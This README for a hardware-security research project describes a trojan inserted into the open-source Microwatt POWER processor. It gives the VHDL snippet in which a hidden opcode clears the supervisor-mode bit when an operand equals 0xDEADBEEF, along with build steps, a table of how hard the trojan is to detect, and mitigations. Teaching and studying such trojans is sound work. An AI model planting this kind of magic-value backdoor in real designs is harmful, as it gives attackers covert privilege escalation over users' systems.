# Microwatt Hardware Trojan Research Project

A research demonstration of hardware trojan implementation in the Microwatt open-source POWER ISA processor, designed for educational purposes and security research.

## Overview

This project demonstrates how a hardware trojan can be inserted into a processor's RTL design, highlighting the challenges in hardware security and the importance of trusted semiconductor supply chains. The trojan is implemented as a seemingly benign arithmetic instruction that secretly escalates privileges when triggered by a specific value.

## Key Features

- **Real Trojan Implementation**: Functional backdoor in working POWER CPU
- **Minimal Overhead**: <20 lines of VHDL, <0.01% area impact
- **Stealthy Design**: Passes code review and testing
- **Complete Documentation**: Research paper, demo script, and tutorials
- **Reproducible**: Docker-based environment for easy replication

## Project Structure

```
hack_proj/
├── dependencies/
│   └── microwatt/          # Modified Microwatt processor with trojan
│       ├── decode_types.vhdl    # Added OP_TROJAN instruction type
│       ├── decode1.vhdl         # Added opcode 5 decode entry
│       ├── execute1.vhdl        # Trojan implementation
│       └── tests/trojan/        # Test programs
├── docs/
│   ├── TROJAN_RESEARCH.md  # Complete research paper
│   └── DEMO_SCRIPT.md      # Presentation guide
├── docker/
│   └── Dockerfile          # Development environment
├── docker-compose.yml      # Container orchestration
└── README.md               # This file
```

## Quick Start

### Prerequisites

- Docker and Docker Compose
- 4GB RAM minimum
- 10GB disk space

### Build and Run

```bash
# 1. Clone the repository
cd hack_proj

# 2. Start Docker environment
docker-compose up -d

# 3. Build Microwatt simulator with trojan
docker-compose run --rm ghdl bash -c "cd dependencies/microwatt && make clean && make core_tb"

# 4. Generate and run trojan test
cd dependencies/microwatt/tests/trojan
python3 generate_test.py
cp trojan_test.bin ../../main_ram.bin
cd ../..
./core_tb
```

## Technical Details

### Trojan Design

**Instruction Format**: Opcode 5 (unused in standard POWER ISA)

**Normal Operation**:
```vhdl
-- Performs: RT = RA + RB
v.e.write_data := std_ulogic_vector(unsigned(a_in) + unsigned(b_in));
```

**Trojan Payload**:
```vhdl
-- If RA == 0xDEADBEEF, escalate to supervisor mode
if a_in = x"00000000DEADBEEF" then
    v.se.write_msr := '1';
    v.new_msr := ex1.msr;
    v.new_msr(MSR_PR) := '0';  -- Clear Problem State bit
end if
```

### Modified Files

1. **decode_types.vhdl**: Added `OP_TROJAN` instruction type
2. **decode1.vhdl**: Added decode entry for opcode 5
3. **execute1.vhdl**: Implemented trojan logic

### Hardware Impact

- **Code**: +15 lines (~0.07% of execute1.vhdl)
- **Gates**: ~50 gates (comparator + mux)
- **Area**: <0.01% of CPU
- **Timing**: Zero impact (parallel execution)
- **Power**: Negligible

## Security Analysis

### Threat Model

- **Adversary**: Malicious foundry or compromised design team
- **Goal**: Privilege escalation backdoor
- **Activation**: Magic value in instruction operand
- **Stealth**: Minimal code changes, normal operation

### Detection Difficulty

| Method | Effectiveness | Notes |
|--------|--------------|-------|
| Code Review | **LOW** | Hidden in 20K+ lines |
| Testing | **VERY LOW** | 1 in 2^32 chance of random trigger |
| Formal Verification | **MEDIUM** | Requires complete security properties |
| Side-Channel Analysis | **LOW** | Minimal observable difference |
| Physical Inspection | **HIGH** | Requires chip decap and analysis |

### Impact Assessment

- **CVSS Score**: 9.8/10 (Critical)
- **Exploitability**: HIGH (trivial with knowledge)
- **Impact**: CRITICAL (complete system compromise)
- **Scope**: UNIVERSAL (all chips from tainted source)

## Use Cases

### Research and Education

1. **Hardware Security Courses**: Demonstrate real trojans
2. **Supply Chain Security**: Understand threat landscape
3. **Verification Research**: Test detection tools
4. **Policy Discussions**: Inform hardware security policy

### Responsible Disclosure

This is a research project on an open-source processor. No deployed systems are affected. We are coordinating with Microwatt maintainers for responsible disclosure.

## Documentation

- **[TROJAN_RESEARCH.md](docs/TROJAN_RESEARCH.md)**: Complete research paper with detailed analysis
- **[DEMO_SCRIPT.md](docs/DEMO_SCRIPT.md)**: Step-by-step presentation guide
- **[Microwatt Documentation](dependencies/microwatt/README.md)**: Original processor documentation

## Mitigation Strategies

### Prevention
- Multiple independent design reviews
- Formal verification with security properties
- Open-source hardware transparency
- Trusted foundry programs

### Detection
- Golden chip comparison testing
- Exhaustive simulation with all inputs
- Statistical anomaly detection
- Physical reverse engineering

### Response
- Hardware security modules
- Trusted execution environments
- Software-based workarounds (limited)
- Chip replacement (ultimate solution)

## Contributing

This is a research project demonstrating security vulnerabilities. If you find issues or have suggestions:

1. **Security Improvements**: Contact maintainers privately
2. **Documentation**: Submit pull requests
3. **Testing**: Share test cases and results
4. **Research**: Cite this work and build upon it

## Related Work

- **Becker et al. (2013)**: Stealthy Dopant-Level Hardware Trojans
- **King et al. (2008)**: Designing and Implementing Malicious Hardware
- **Sturton et al. (2011)**: Defeating UCI
- **Tehranipoor & Koushanfar (2010)**: Hardware Trojan Taxonomy

## License

This research builds upon Microwatt, which is licensed under CC-BY-4.0. Our modifications are provided for research and educational purposes.

**Important**: This code demonstrates security vulnerabilities and should only be used in controlled environments for legitimate research and education.

## Contact

- **Research Questions**: [your-email]
- **Security Concerns**: [security-contact]
- **Project Repository**: https://github.com/[your-repo]/microwatt-trojan
- **Original Microwatt**: https://github.com/antonblanchard/microwatt

## Acknowledgments

- **Microwatt Team**: Anton Blanchard and contributors for the open-source processor
- **POWER Foundation**: For the open POWER ISA specification
- **Hardware Security Community**: For prior research and tools

## Disclaimer

This research is conducted for educational and defensive security purposes only. The trojan is implemented in a controlled research environment and does not affect any deployed systems. Users are responsible for ensuring appropriate use in compliance with applicable laws and regulations.

---

**Last Updated**: October 18, 2025  
**Version**: 1.0  
**Status**: Research Demonstration
